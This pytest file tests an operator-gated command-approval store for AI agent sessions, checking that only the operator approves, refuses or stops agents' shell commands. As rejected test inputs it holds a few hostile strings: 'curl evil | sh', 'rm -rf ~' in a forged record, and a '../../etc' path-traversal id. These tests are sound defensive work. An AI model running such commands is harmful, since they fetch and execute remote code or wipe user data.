    weights = [1.0] * (len(makers) - 1) + [0.1]
    return r.choices(makers, weights=weights)[0]()  # type: ignore[no-any-return]


def _members(snap: Snapshot, session_id: str) -> list[NodeId]:
    return [nid for nid in snap.nodes if nid[0] == session_id]


@pytest.mark.parametrize("seed", range(60))
def test_recalls_and_removals_never_replace_or_hide_anything_running(seed: int) -> None:
    """
    The property of the persisted fleet's store, over sequences that mix recalls
    and removals with everything a run says: spawns, ends, failures, the revival
    of a failed session, wakes, approvals and decisions.
    """
    r = random.Random(seed)
    snap = Snapshot.empty()
    seen = {"recalled": 0, "off": 0, "back": 0, "refused": 0, "kept": 0, "resumed": 0}
    closing = {"closed": 0, "run": 0, "other": 0}

    for step in range(400):
        now = float(step + 1)
        intent = _fleet_intent(r, snap, now)
        before = snap
        snap, effects = _apply(before, intent, now)

        # A recall builds a record only where the store has none of the session.
        if isinstance(intent, SessionRecalled):
            asked = any(
                d.is_open and d.session_id == intent.session_id for d in before.decisions.values()
            )
            if _members(before, intent.session_id) or asked:
                assert snap is before
                seen["kept"] += 1
            else:
                assert snap.nodes[(intent.session_id, None)].recalled is not None
                seen["recalled"] += 1

        # A removal is answered, and honoured exactly where the session is over.
        if isinstance(intent, SessionDetached):
            (answer,) = effects
            assert isinstance(answer, SessionDetachSettled)
            assert answer.refusal is before.detach_refusal(intent.session_id)
            if answer.refusal is None:
                assert snap.off_fleet(intent.session_id)
            else:
                assert snap is before
                seen["refused"] += 1

        # Closing a failed session ends its root for good, only on the shell's
        # word that no run is left. Nothing parked is dropped by it: a failed
        # node carries no approval.
        if isinstance(intent, FailedSessionClosed):
            assert effects == ()
            was = before.nodes.get(intent.node_id)
            failed = (
                was is not None and intent.node_id[1] is None and was.state is AgentState.FAILED
            )
            if failed and not intent.run_held:
                assert was is not None and was.pending == ()
                closed = snap.nodes[intent.node_id]
                assert closed == was.with_(
                    state=AgentState.DONE, acknowledged=True, error=None, state_since=now
                )
                assert {n: rec for n, rec in snap.nodes.items() if n != intent.node_id} == {
                    n: rec for n, rec in before.nodes.items() if n != intent.node_id
                }
                # Its failure row is the one thing it stops owing. By kind and
                # node: a decision's row words its asker's fate, which moved.
                assert [(type(o), o.node, o.since) for o in snap.needs_you] == [
                    (type(o), o.node, o.since)
                    for o in before.needs_you
                    if not (isinstance(o, SessionFailed) and o.node == intent.node_id)
                ]
                closing["closed"] += 1
            else:
                assert snap is before
                closing["run"] += failed and intent.run_held
                closing["other"] += not failed and not intent.run_held

        # An announce clears both.
        if isinstance(intent, AgentSpawned) and intent.node_id[1] is None:
            announced = snap.nodes[intent.node_id]
            assert announced.recalled is None and not announced.detached
            was = before.nodes.get(intent.node_id)
            seen["resumed"] += was is not None and was.recalled is not None

        owed = {o.node for o in snap.needs_you}
        for nid, rec in snap.nodes.items():
            if rec.recalled is not None:
                # Never live, never owed, and nothing on it this process measured.
                assert nid[1] is None and rec.state is AgentState.DONE
                assert nid not in owed and rec.pending == ()
                assert rec.usage == UsageRollup() and rec.context is None
                assert (rec.started_at, rec.ended_at, rec.error) == (0.0, None, None)
                assert rec.deliverable is None and rec.topic == "closed"
            if rec.detached:
                # Off the fleet is over: no agent of it able to act, nothing owed.
                assert nid[1] is None and rec.state.is_final
                assert all(snap.nodes[m].state.is_terminal for m in _members(snap, nid[0]))
                assert not any(node[0] == nid[0] for node in owed)
                assert snap.off_fleet(nid[0])
                seen["off"] += 1
            elif nid[1] is None:
                assert not snap.off_fleet(nid[0])
            # Only the operator's word takes a session off.
            earlier = before.nodes.get(nid)
            if rec.detached and (earlier is None or not earlier.detached):
                assert isinstance(intent, SessionDetached) and intent.session_id == nid[0]
            if earlier is not None and earlier.detached and not rec.detached:
                seen["back"] += 1
        # And a session with no root is on no fleet to be off.
        assert not any(
            snap.off_fleet(sid) for sid in _FLEET_SESSIONS if (sid, None) not in snap.nodes
        )
        assert snap.any_active == any(rec.state.is_active for rec in snap.nodes.values())

        # Closed cards after everything launched here.
        kinds = [snap.nodes[nid].recalled is not None for nid in snap.order if nid[1] is None]
        assert kinds == sorted(kinds)

    assert seen["recalled"] and seen["kept"] and seen["refused"] and seen["off"], seen
    _CLOSINGS.append(closing)


# What each seed of the property above closed and refused to close, for the test
# that the sequences reach each case.
_CLOSINGS: list[dict[str, int]] = []


def test_the_generated_sequences_close_failed_sessions_and_refuse_both_ways() -> None:
    """
    The closing assertions above pass on a run that never generates a failed
    root to close. Counted over every seed: roots are closed, the close is
    refused for a run the shell asserted, and it is asked of nodes that are not
    failed roots and changes nothing.
    """
    if len(_CLOSINGS) < 60:
        pytest.skip("needs every seed of the property test to have run in this process")
    total = {key: sum(c[key] for c in _CLOSINGS) for key in ("closed", "run", "other")}
    assert all(count >= 5 for count in total.values()), total


def _failed_session(store: Store, root: NodeId = ROOT) -> None:
    store.apply(spawn(root), now=1.0)
    store.apply(AgentFinished(root, AgentState.FAILED, ended_at=2.0, error="boom"), now=2.0)


def test_a_failed_session_with_no_run_is_closed_for_good_and_can_then_leave() -> None:
    """
    The card that could never be removed. FAILED is an end a later message
    undoes, so the store refuses to take a failed session off the fleet, and
    with no run left nothing would ever report the end that makes it final.
    """
    store = Store()
    _failed_session(store)
    assert _detach(store, "sess-1") is DetachRefusal.FAILED_NOT_CLOSED

    assert store.apply(FailedSessionClosed(ROOT, run_held=False), now=9.0) == ()

    rec = store.snapshot().nodes[ROOT]
    assert (rec.state, rec.acknowledged, rec.error) == (AgentState.DONE, True, None)
    assert (rec.ended_at, rec.state_since) == (2.0, 9.0), "it ended when it failed"
    assert store.snapshot().needs_you == ()
    assert _detach(store, "sess-1") is None and store.snapshot().off_fleet("sess-1")
    # Final: the message that would have revived a failed root no longer does.
    store.apply(StateChanged(ROOT, AgentState.THINKING), now=10.0)
    assert store.snapshot().nodes[ROOT].state is AgentState.DONE
    assert store.snapshot().off_fleet("sess-1")


def test_closing_a_failed_session_is_refused_while_a_run_is_asserted() -> None:
    """
    The hazard F1 names: a failed root whose client is still connected. The
    shell says a run is held, and the store leaves the session exactly as it
    was -- revivable, owing its row, and not removable.
    """
    store = Store()
    _failed_session(store)
    before = store.snapshot()

    assert store.apply(FailedSessionClosed(ROOT, run_held=True), now=9.0) == ()

    assert store.snapshot().nodes == before.nodes
    assert _detach(store, "sess-1") is DetachRefusal.FAILED_NOT_CLOSED
    store.apply(StateChanged(ROOT, AgentState.THINKING), now=10.0)
    assert store.snapshot().nodes[ROOT].state is AgentState.THINKING


def test_closing_a_failed_session_closes_nothing_else() -> None:
    """
    A root that is not failed, a sub-agent, and a node the store never had.
    """
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(spawn(CHILD, ROOT), now=1.0)
    store.apply(AgentFinished(CHILD, AgentState.FAILED, ended_at=2.0, error="x"), now=2.0)
    before = store.snapshot()

    for node in (ROOT, CHILD, OTHER):
        store.apply(FailedSessionClosed(node, run_held=False), now=5.0)
        assert store.snapshot().nodes == before.nodes, node


def test_a_closed_session_with_a_failed_subagent_can_leave_once_its_row_is_dismissed() -> None:
    """
    A run that ends leaves the sub-agents it had given up on in FAILED, and
    nothing closes a sub-agent. With the root final that is no bar to leaving;
    its failure row is, until it is dismissed, and a sub-agent that came back to
    life would be.
    """
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(spawn(CHILD, ROOT), now=1.0)
    store.apply(AgentFinished(CHILD, AgentState.FAILED, ended_at=2.0, error="quiet"), now=2.0)
    store.apply(AgentFinished(ROOT, AgentState.DONE, ended_at=3.0), now=3.0)

    assert _detach(store, "sess-1") is DetachRefusal.OWES
    store.apply(FailureAcknowledged(CHILD), now=4.0)
    assert _detach(store, "sess-1") is None and store.snapshot().off_fleet("sess-1")

    store.apply(StateChanged(CHILD, AgentState.THINKING), now=5.0)
    assert not store.snapshot().off_fleet("sess-1"), "an agent of it is running again"
    assert not store.snapshot().nodes[ROOT].detached


def test_the_generated_sequences_reach_what_the_property_is_about() -> None:
    """
    The test above passes on a run in which nothing ever leaves the fleet or
    comes back, so the runs are counted: across the seeds, sessions are recalled,
    resumed, taken off the fleet and brought back by something of theirs acting.
    """
    total = {"recalled": 0, "resumed": 0, "detached": 0, "back": 0, "refused_failed": 0}
    for seed in range(60):
        r = random.Random(seed)
        snap = Snapshot.empty()
        for step in range(400):
            now = float(step + 1)
            intent = _fleet_intent(r, snap, now)
            before = snap
            snap, effects = _apply(before, intent, now)
            if isinstance(intent, SessionRecalled) and snap is not before:
                total["recalled"] += 1
            if isinstance(intent, AgentSpawned):
                was = before.nodes.get(intent.node_id)
                total["resumed"] += was is not None and was.recalled is not None
            if isinstance(intent, SessionDetached) and effects:
                answer = effects[0]
                assert isinstance(answer, SessionDetachSettled)
                total["detached"] += answer.refusal is None and snap is not before
                total["refused_failed"] += answer.refusal is DetachRefusal.FAILED_NOT_CLOSED
            for nid, rec in before.nodes.items():
                after = snap.nodes.get(nid)
                total["back"] += rec.detached and after is not None and not after.detached
    assert all(count >= 20 for count in total.values()), total


# -- break-glass commands ------------------------------------------------------------
#
# The property: only an intent from the operator starts, refuses or stops a
# command, and only an end that names no node ends a running one; the string
# that runs is the one on the approval; a command is approved at most once; one
# runs per session; and no agent's intent alters a command another agent asked
# for, or its own once it is approved.

CS, CT = "cs", "ct"
C_ROOT: NodeId = (CS, None)
C_ASKER: NodeId = (CS, "w1")
C_PEER: NodeId = (CS, "w2")
C_OTHER_ROOT: NodeId = (CT, None)
C_OUTSIDER: NodeId = (CT, "x1")
C_AGENTS: tuple[NodeId, ...] = (C_ROOT, C_ASKER, C_PEER, C_OTHER_ROOT, C_OUTSIDER)
# Everybody an intent can claim to be from. None is the operator, or the shell.
C_EVERYONE: tuple[NodeId | None, ...] = (None, *C_AGENTS)


def cid(n: int) -> str:
    return f"cmd-20261013T000000Z-{n:012x}"


def handed(n: int, asked: str = "make install", **fields: Any) -> Command:
    """A record as a handler would build it. The asker written here is never the one kept."""
    return Command(
        **{
            "id": cid(n),
            "asker": ("nobody", "at-all"),
            "asked": asked,
            "reason": "the build needs it",
            "expects": "a wheel under dist/",
            "asked_at": -1.0,
            **fields,
        }
    )


def step(snap: Snapshot, *intents: Intent) -> tuple[Snapshot, tuple[Effect, ...]]:
    """Apply in order; the effects are the last intent's."""
    effects: tuple[Effect, ...] = ()
    for intent in intents:
        snap, effects = _apply(snap, intent, 1.0)
    return snap, effects


def command_world() -> Snapshot:
    snap, _ = step(
        Snapshot.empty(),
        spawn(C_ROOT),
        spawn(C_ASKER, C_ROOT),
        spawn(C_PEER, C_ROOT),
        spawn(C_OTHER_ROOT),
        spawn(C_OUTSIDER, C_OTHER_ROOT),
    )
    return snap


def asked_by(snap: Snapshot, who: NodeId, n: int, at: float = 100.0) -> Snapshot:
    after, effects = step(snap, CommandRequested(who, handed(n), "rq", at))
    assert effects == (CommandSettled("rq", cid(n)),), effects
    return after


def approve(n: int, text: str = "make install", *, who: NodeId | None = None) -> CommandApproved:
    return CommandApproved(cid(n), text, "/bin/zsh", "/w", 600, 200.0, node_id=who)


def ended(n: int, outcome: Any = None, *, who: NodeId | None = None) -> CommandEnded:
    return CommandEnded(
        cid(n), End(outcome=Exited(code=0) if outcome is None else outcome, at=300.0), node_id=who
    )


def test_a_request_is_filed_under_the_gates_sender_with_nothing_already_done_to_it() -> None:
    """
    The record handed in claims another asker, an earlier time, an approval, a
    stop, a clean exit and a delivery. None of it is kept.
    """
    already_run = handed(
        1,
        run=Run(text="rm -rf ~", shell="/bin/sh", cwd="/", timeout_s=600, started_at=1.0),
        stop_asked_at=2.0,
        end=End(outcome=Exited(code=0), at=3.0, output_bytes=4, tail="done"),
        first_delivered_at=4.0,
    )

    snap, effects = step(command_world(), CommandRequested(C_ASKER, already_run, "rq", 100.0))

    assert effects == (CommandSettled("rq", cid(1)),)
    assert snap.commands[cid(1)] == Command(
        id=cid(1),
        asker=C_ASKER,
        asked="make install",
        reason="the build needs it",
        expects="a wheel under dist/",
        asked_at=100.0,
    )
    assert snap.commands[cid(1)].state is CommandState.ASKED


@pytest.mark.parametrize(
    ("fields", "refusal"),
    [
        ({"asked": "   "}, RequestRefusal.EMPTY),
        ({"asked": "-x"}, RequestRefusal.LEADS_WITH_OPTION),
        ({"asked": "+x"}, RequestRefusal.LEADS_WITH_OPTION),
        ({"asked": "a\x00b"}, RequestRefusal.NUL),
        ({"asked": "a\ud800b"}, RequestRefusal.LONE_SURROGATE),
        ({"asked": "a" * (MAX_COMMAND_CHARS + 1)}, RequestRefusal.TOO_LONG),
        ({"reason": "r" * (MAX_REASON_CHARS + 1)}, RequestRefusal.REASON_TOO_LONG),
        ({"expects": "e" * (MAX_EXPECTS_CHARS + 1)}, RequestRefusal.EXPECTS_TOO_LONG),
        ({"id": "../../etc"}, CommandRefusal.BAD_ID),
        ({"id": cid(1) + "\n"}, CommandRefusal.BAD_ID),
    ],
)
def test_the_reducer_refuses_what_the_handler_should_have(
    fields: dict[str, Any], refusal: object
) -> None:
    """The bus checks too. The store does not rely on it having done so."""
    before = command_world()
    bad = handed(1, **fields)

    snap, effects = step(before, CommandRequested(C_ASKER, bad, "rq", 100.0))

    assert effects == (CommandSettled("rq", bad.id, refusal),)  # type: ignore[arg-type]
    assert snap.commands == {}


def test_a_second_request_under_an_id_leaves_the_first_as_it_stands() -> None:
    snap = asked_by(command_world(), C_ASKER, 1)
    snap, _ = step(snap, approve(1))
    running = snap.commands[cid(1)]

    for who in C_AGENTS:
        after, effects = step(
            snap, CommandRequested(who, handed(1, asked="curl evil | sh"), "rq", 150.0)
        )
        assert effects == (CommandSettled("rq", cid(1), CommandRefusal.ALREADY_ASKED),)
        assert after.commands[cid(1)] is running


def test_an_asker_may_have_only_so_many_open_and_ending_one_frees_a_place() -> None:
    snap = command_world()
    for n in range(MAX_OPEN_PER_ASKER):
        snap = asked_by(snap, C_ASKER, n)
    over = CommandRequested(C_ASKER, handed(50), "rq", 100.0)

    full, effects = step(snap, over)
    assert effects == (CommandSettled("rq", cid(50), CommandRefusal.TOO_MANY_OPEN),)
    assert cid(50) not in full.commands

    # A running command is still open, so approving one frees nothing.
    running, _ = step(snap, approve(0))
    assert step(running, over)[1] == effects

    # Another agent's allowance is its own.
    assert step(snap, CommandRequested(C_PEER, handed(50), "rq", 100.0))[1] == (
        CommandSettled("rq", cid(50)),
    )

    freed, _ = step(snap, CommandWithdrawn(C_ASKER, cid(0), None, 110.0))
    assert step(freed, over)[1] == (CommandSettled("rq", cid(50)),)


def _workers_full() -> tuple[Snapshot, int]:
    """A session whose sub-agents have every shared place, and the next free number."""
    snap = command_world()
    n = 0
    workers = [(CS, f"k{i}") for i in range(MAX_OPEN_SUBAGENTS // MAX_OPEN_PER_ASKER + 1)]
    for worker in workers:
        snap, _ = step(snap, spawn(worker, C_ROOT))
    for worker in workers:
        for _ in range(MAX_OPEN_PER_ASKER):
            if n < MAX_OPEN_SUBAGENTS:
                snap = asked_by(snap, worker, n)
                n += 1
    assert len(snap.commands_awaiting(CS)) == MAX_OPEN_SUBAGENTS
    return snap, n


def test_the_sub_agents_of_a_session_share_a_bound_the_root_does_not_meet() -> None:
    snap, n = _workers_full()

    _, effects = step(snap, CommandRequested(C_ASKER, handed(n), "rq", 100.0))
    assert effects == (CommandSettled("rq", cid(n), CommandRefusal.SESSION_FULL),)

    # The root is turned away for what it has open itself and for nothing else,
    # and what it has open spends none of the sub-agents' places.
    for i in range(MAX_OPEN_PER_ASKER):
        snap = asked_by(snap, C_ROOT, n + i)
    _, effects = step(snap, CommandRequested(C_ROOT, handed(n + 10), "rq", 100.0))
    assert effects == (CommandSettled("rq", cid(n + 10), CommandRefusal.TOO_MANY_OPEN),)

    # Another session's sub-agents have their own.
    assert step(snap, CommandRequested(C_OUTSIDER, handed(n + 11), "rq", 100.0))[1] == (
        CommandSettled("rq", cid(n + 11)),
    )

    # With one of the sub-agents' places free, a sub-agent has it, whatever the
    # root holds.
    freed, _ = step(snap, CommandRefused(cid(0), "no", 110.0))
    assert step(freed, CommandRequested(C_ASKER, handed(n + 12), "rq", 120.0))[1] == (
        CommandSettled("rq", cid(n + 12)),
    )


def test_a_finished_workers_open_commands_do_not_turn_a_working_one_away() -> None:
    snap, n = _workers_full()
    request = CommandRequested(C_ASKER, handed(n), "rq", 100.0)
    assert step(snap, request)[1] == (CommandSettled("rq", cid(n), CommandRefusal.SESSION_FULL),)

    gone, _ = step(snap, AgentFinished((CS, "k0"), AgentState.FAILED, 5.0, "died"))

    assert step(gone, request)[1] == (CommandSettled("rq", cid(n)),)


# What each intent does to one command asked by C_ASKER, as a function of who it
# claims to be from: the builder, and the set of senders it is applied for.
_ON_ASKED: list[tuple[str, Any, frozenset[NodeId | None]]] = [
    ("approve", lambda who: approve(1, who=who), frozenset({None})),
    ("refuse", lambda who: CommandRefused(cid(1), "no", 200.0, node_id=who), frozenset({None})),
    ("stop", lambda who: CommandStopAsked(cid(1), 200.0, node_id=who), frozenset()),
    ("end", lambda who: ended(1, who=who), frozenset()),
    ("end unstarted", lambda who: ended(1, NotStarted("no shell"), who=who), frozenset()),
    (
        "restore over it",
        lambda who: CommandsRestored(
            CS,
            (dataclasses.replace(handed(1), asker=C_ASKER, end=End(Lapsed(), 1.0)),),
            node_id=who,
        ),
        frozenset(),
    ),
]
_ON_RUNNING: list[tuple[str, Any, frozenset[NodeId | None]]] = [
    ("approve", lambda who: approve(1, "echo again", who=who), frozenset()),
    ("refuse", lambda who: CommandRefused(cid(1), "no", 250.0, node_id=who), frozenset()),
    ("stop", lambda who: CommandStopAsked(cid(1), 250.0, node_id=who), frozenset({None})),
    ("end", lambda who: ended(1, who=who), frozenset({None})),
    ("end unstarted", lambda who: ended(1, NotStarted("no shell"), who=who), frozenset({None})),
    ("end refused", lambda who: ended(1, Refused("no"), who=who), frozenset()),
    ("end withdrawn", lambda who: ended(1, CommandTakenBack(), who=who), frozenset()),
    ("end lapsed", lambda who: ended(1, Lapsed(), who=who), frozenset()),
]


def _acts(table: list[tuple[str, Any, frozenset[NodeId | None]]]) -> list[Any]:
    return [
        pytest.param(build, who, who in may, id=f"{name} from {'operator' if who is None else who}")
        for name, build, may in table
        for who in C_EVERYONE
    ]


@pytest.mark.parametrize(("build", "who", "applied"), _acts(_ON_ASKED))
def test_only_the_operator_acts_on_a_command_that_is_asked(
    build: Any, who: NodeId | None, applied: bool
) -> None:
    before = asked_by(command_world(), C_ASKER, 1)

    after, effects = step(before, build(who))

    assert (after.commands[cid(1)] != before.commands[cid(1)]) is applied
    if not applied:
        assert after is before and effects == ()


@pytest.mark.parametrize(("build", "who", "applied"), _acts(_ON_RUNNING))
def test_only_the_operator_and_the_runners_end_act_on_a_command_that_is_running(
    build: Any, who: NodeId | None, applied: bool
) -> None:
    before, _ = step(asked_by(command_world(), C_ASKER, 1), approve(1))

    after, effects = step(before, build(who))

    assert (after.commands[cid(1)] != before.commands[cid(1)]) is applied
    if not applied:
        assert after is before and effects == ()
    assert after.commands[cid(1)].run == before.commands[cid(1)].run


@pytest.mark.parametrize("who", C_AGENTS)
def test_only_the_asker_withdraws_and_only_while_it_is_asked(who: NodeId) -> None:
    asked = asked_by(command_world(), C_ASKER, 1)
    running, _ = step(asked, approve(1))
    over, _ = step(running, ended(1))
    withdraw = CommandWithdrawn(who, cid(1), "rq", 150.0)

    after, effects = step(asked, withdraw)
    if who == C_ASKER:
        assert effects == (CommandSettled("rq", cid(1)),)
        assert after.commands[cid(1)].end == End(outcome=CommandTakenBack(), at=150.0)
        assert after.commands[cid(1)].run is None
    else:
        assert effects == (CommandSettled("rq", cid(1), CommandRefusal.NOT_THE_ASKER),)
        assert after.commands == asked.commands

    for later in (running, over):
        after, effects = step(later, withdraw)
        expected = CommandRefusal.NOT_ASKED if who == C_ASKER else CommandRefusal.NOT_THE_ASKER
        assert effects == (CommandSettled("rq", cid(1), expected),)
        assert after.commands == later.commands

    _, effects = step(asked, CommandWithdrawn(who, cid(9), "rq", 150.0))
    assert effects == (CommandSettled("rq", cid(9), CommandRefusal.NO_SUCH_COMMAND),)


def test_a_withdrawal_ahead_of_the_approval_makes_the_approval_a_no_op() -> None:
    """The asker withdraws while the operator is editing; the press then lands."""
    withdrawn, _ = step(
        asked_by(command_world(), C_ASKER, 1), CommandWithdrawn(C_ASKER, cid(1), None, 150.0)
    )

    after, effects = step(withdrawn, approve(1))

    assert after is withdrawn and effects == ()
    assert after.command_approval_refusal(cid(1), "make install", 600) is CommandRefusal.NOT_ASKED


def test_what_runs_is_the_string_on_the_approval_and_the_order_carries_that_record() -> None:
    asked = asked_by(command_world(), C_ASKER, 1)

    snap, effects = step(
        asked, CommandApproved(cid(1), "make install PREFIX=/opt", "/bin/zsh", "/w", 1_800, 200.0)
    )

    held = snap.commands[cid(1)]
    assert held.run == Run(
        text="make install PREFIX=/opt",
        shell="/bin/zsh",
        cwd="/w",
        timeout_s=1_800,
        started_at=200.0,
    )
    assert held.asked == "make install" and held.edited and held.state is CommandState.RUNNING
    assert effects == (CommandToRun(command=held),)
    assert isinstance(effects[0], CommandToRun) and effects[0].command is held

    # Unedited, it is still the approval's string that is recorded.
    snap, _ = step(asked, approve(1))
    unedited = snap.commands[cid(1)]
    assert unedited.run is not None and unedited.run.text == "make install"
    assert not unedited.edited


@pytest.mark.parametrize(
    ("text", "shell", "timeout_s", "refusal"),
    [
        ("-x", "/bin/sh", 600, RequestRefusal.LEADS_WITH_OPTION),
        ("+x", "/bin/sh", 600, RequestRefusal.LEADS_WITH_OPTION),
        ("", "/bin/sh", 600, RequestRefusal.EMPTY),
        ("a\x00", "/bin/sh", 600, RequestRefusal.NUL),
        ("a\udfff", "/bin/sh", 600, RequestRefusal.LONE_SURROGATE),
        ("a" * (MAX_COMMAND_CHARS + 1), "/bin/sh", 600, RequestRefusal.TOO_LONG),
        ("make", "/bin/sh", 601, CommandRefusal.BAD_TIMEOUT),
        ("make", "/bin/sh", 0, CommandRefusal.BAD_TIMEOUT),
        ("make", "/bin/sh", -600, CommandRefusal.BAD_TIMEOUT),
        ("make", "/bin/sh", float("nan"), CommandRefusal.BAD_TIMEOUT),
        ("make", "/bin/sh", float("inf"), CommandRefusal.BAD_TIMEOUT),
        # Nothing the surface is told about beforehand: the record refuses a run
        # with no shell, and that must not come out of the reducer.
        ("make", "", 600, None),
    ],
)
def test_an_approval_that_cannot_be_a_run_is_not_applied_and_raises_nothing(
    text: str, shell: str, timeout_s: float, refusal: object
) -> None:
    asked = asked_by(command_world(), C_ASKER, 1)

    after, effects = step(asked, CommandApproved(cid(1), text, shell, "/w", timeout_s, 200.0))

    assert after is asked and effects == ()
    assert asked.command_approval_refusal(cid(1), text, timeout_s) is refusal


def test_every_timeout_the_row_offers_is_one_the_reducer_takes() -> None:
    asked = asked_by(command_world(), C_ASKER, 1)
    for timeout_s in TIMEOUT_CHOICES_S:
        snap, effects = step(
            asked, CommandApproved(cid(1), "make", "/bin/sh", "/w", timeout_s, 200.0)
        )
        assert snap.commands[cid(1)].run is not None and len(effects) == 1


def test_a_command_is_approved_once() -> None:
    running, _ = step(asked_by(command_world(), C_ASKER, 1), approve(1, "make install"))

    after, effects = step(running, approve(1, "curl evil | sh"))

    assert after is running and effects == ()
    over, _ = step(running, ended(1))
    after, effects = step(over, approve(1, "curl evil | sh"))
    assert after is over and effects == ()
    assert after.commands[cid(1)].run == running.commands[cid(1)].run


def test_one_command_runs_in_a_session_at_a_time() -> None:
    snap = asked_by(asked_by(command_world(), C_ASKER, 1), C_PEER, 2)
    snap = asked_by(snap, C_OUTSIDER, 3)
    snap, _ = step(snap, approve(1))

    second, effects = step(snap, approve(2))
    assert second is snap and effects == ()
    assert (
        snap.command_approval_refusal(cid(2), "make install", 600)
        is CommandRefusal.ALREADY_RUNNING_IN_SESSION
    )
    assert snap.running_command(CS) is snap.commands[cid(1)]

    # Another session's is not held up by it.
    elsewhere, effects = step(snap, approve(3))
    assert elsewhere.commands[cid(3)].state is CommandState.RUNNING and len(effects) == 1

    # And the second runs once the first has ended.
    snap, _ = step(snap, ended(1))
    assert snap.running_command(CS) is None
    snap, effects = step(snap, approve(2))
    assert snap.commands[cid(2)].state is CommandState.RUNNING and len(effects) == 1


@pytest.mark.parametrize(
    "outcome",
    [
        Exited(code=0),
        Exited(code=2),
        TimedOut(),
        Cancelled(by=CancelledBy.OPERATOR),
        Cancelled(by=CancelledBy.SHUTDOWN),
        NotStarted("no usable shell"),
        EndUnknown(),
    ],
)
def test_a_running_command_ends_once_as_the_first_end_says(outcome: Any) -> None:
    running, _ = step(asked_by(command_world(), C_ASKER, 1), approve(1))

    over, effects = step(running, ended(1, outcome))

    # Its asker's session is woken, once (``effects.SessionWoken``).
    assert effects == (SessionWoken(C_ASKER[0], WakeReason.COMMAND_ENDED, cid(1)),)
    assert over.commands[cid(1)].end == End(outcome=outcome, at=300.0)
    assert over.commands[cid(1)].run == running.commands[cid(1)].run
    for again in (Exited(code=1), TimedOut(), NotStarted("x")):
        after, effects = step(over, ended(1, again))
        assert after is over and effects == ()


def test_a_refusal_is_the_operators_words_or_nothing() -> None:
    asked = asked_by(command_world(), C_ASKER, 1)

    refused, effects = step(asked, CommandRefused(cid(1), "  not on this machine\n", 210.0))
    assert effects == (SessionWoken(C_ASKER[0], WakeReason.COMMAND_ENDED, cid(1)),)
    assert refused.commands[cid(1)].end == End(Refused("  not on this machine\n"), 210.0)
    assert refused.commands[cid(1)].run is None

    whole = "r" * MAX_COMMAND_REFUSAL_CHARS
    assert step(asked, CommandRefused(cid(1), whole, 210.0))[0].commands[cid(1)].end is not None
    too_long, effects = step(asked, CommandRefused(cid(1), whole + "r", 210.0))
    assert too_long is asked and effects == ()

    # Ended, it stays as it ended.
    after, _ = step(refused, CommandRefused(cid(1), "changed my mind", 220.0))
    assert after is refused
    assert step(asked, CommandRefused(cid(7), "no", 210.0))[0] is asked


def test_a_stop_is_stamped_once_and_ordered_each_time() -> None:
    running, _ = step(asked_by(command_world(), C_ASKER, 1), approve(1))

    stopping, effects = step(running, CommandStopAsked(cid(1), 250.0))
    assert effects == (CommandToStop(command_id=cid(1)),)
    assert stopping.commands[cid(1)].stop_asked_at == 250.0
    # It has not ended: the end is the runner's to report.
    assert stopping.commands[cid(1)].state is CommandState.RUNNING

    again, effects = step(stopping, CommandStopAsked(cid(1), 260.0))
    assert effects == (CommandToStop(command_id=cid(1)),)
    assert again is stopping

    over, _ = step(stopping, ended(1, Cancelled(by=CancelledBy.OPERATOR)))
    assert over.commands[cid(1)].stop_asked_at == 250.0
    after, effects = step(over, CommandStopAsked(cid(1), 270.0))
    assert after is over and effects == ()


def test_who_reads_which_commands() -> None:
    snap = asked_by(command_world(), C_ASKER, 1, at=101.0)
    snap = asked_by(snap, C_PEER, 2, at=102.0)
    snap = asked_by(snap, C_ROOT, 3, at=103.0)
    snap = asked_by(snap, C_OUTSIDER, 4, at=104.0)
    snap, _ = step(snap, CommandRefused(cid(2), "no", 110.0))

    def seen(who: NodeId) -> list[str]:
        _, effects = step(snap, CommandsRead(who, "rq", 120.0))
        (delivered,) = effects
        assert isinstance(delivered, CommandsDelivered) and delivered.request_id == "rq"
        assert delivered.commands is not None
        assert delivered.commands == snap.commands_readable_by(who)
        return [c.id for c in delivered.commands]

    assert seen(C_ASKER) == [cid(1)]
    assert seen(C_PEER) == [cid(2)]
    assert seen(C_ROOT) == [cid(1), cid(2), cid(3)]
    assert seen(C_OUTSIDER) == [cid(4)]
    assert seen(C_OTHER_ROOT) == [cid(4)]
    assert seen((CS, "nobody")) == []
    assert [c.id for c in snap.commands_awaiting(CS)] == [cid(1), cid(3)]
    assert [c.id for c in snap.commands_awaiting()] == [cid(1), cid(3), cid(4)]


def test_only_the_askers_own_read_by_id_of_an_ended_command_marks_it_delivered() -> None:
    asked = asked_by(command_world(), C_ASKER, 1)
    running, _ = step(asked, approve(1))
    over, _ = step(running, ended(1))

    # Open, it has no result to have been handed.
    for still_open in (asked, running):
        after, _ = step(still_open, CommandsRead(C_ASKER, "rq", 400.0, cid(1)))
        assert after.commands[cid(1)].first_delivered_at is None

    # A list shows no output, and nobody but the asker is the asker.
    for reader, named in (
        (C_ASKER, None),
        (C_ROOT, cid(1)),
        (C_PEER, cid(1)),
        (C_OUTSIDER, cid(1)),
        (C_ASKER, cid(9)),
    ):
        after, _ = step(over, CommandsRead(reader, "rq", 400.0, named))
        assert after.commands[cid(1)].first_delivered_at is None, (reader, named)

    read, effects = step(over, CommandsRead(C_ASKER, "rq", 400.0, cid(1)))
    assert read.commands[cid(1)].first_delivered_at == 400.0
    # The reply is the view before the mark.
    (delivered,) = effects
    assert isinstance(delivered, CommandsDelivered) and delivered.commands is not None
    assert delivered.commands[0].first_delivered_at is None

    reread, _ = step(read, CommandsRead(C_ASKER, "rq", 500.0, cid(1)))
    assert reread.commands[cid(1)].first_delivered_at == 400.0


def _on_disk(n: int, asker: NodeId, outcome: Any = None, **fields: Any) -> Command:
    run = Run(text="make install", shell="/bin/sh", cwd="/w", timeout_s=600, started_at=10.0)
    if outcome is None:
        return dataclasses.replace(handed(n), asker=asker, **fields)
    needs_run = not isinstance(outcome, Refused | CommandTakenBack | Lapsed)
    return dataclasses.replace(
        handed(n),
        asker=asker,
        run=run if needs_run else None,
        end=End(outcome=outcome, at=20.0),
        **fields,
    )


def test_a_restore_places_what_ended_where_its_asker_and_the_root_read_it() -> None:
    lapsed = _on_disk(1, C_ASKER, Lapsed())
    unknown = _on_disk(2, C_ROOT, EndUnknown())

    snap, effects = step(command_world(), CommandsRestored(CS, (lapsed, unknown)))

    assert effects == ()
    assert snap.commands == {cid(1): lapsed, cid(2): unknown}
    assert snap.commands_readable_by(C_ROOT) == (lapsed, unknown)
    assert snap.commands_awaiting() == ()
